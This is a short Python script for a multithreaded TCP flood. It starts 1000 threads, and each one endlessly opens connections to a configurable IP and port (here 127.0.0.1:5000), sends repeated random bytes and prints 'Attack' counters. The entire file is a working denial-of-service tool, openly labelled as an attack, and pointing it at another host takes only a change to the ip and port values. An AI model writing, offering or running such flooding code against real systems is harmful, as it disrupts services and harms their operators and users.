import random
import socket
import threading

ip = "127.0.0.1"
port = 5000
pack = 1000
thread = 1000


def start():
    hh = random._urandom(10)
    xx = 0
    while True:
        try:
            # Correct syntax for creating a socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            # Connect to the server
            s.connect(("127.0.0.1", 5000))

            s.send(hh)

            for i in range(pack):
                s.send(hh)

            xx += 1
            print(f"Attack {ip} | Sent: {xx}")
        except Exception as e:
            s.close()
            print(e)


for x in range(thread):
    th = threading.Thread(target=start)
    th.start()
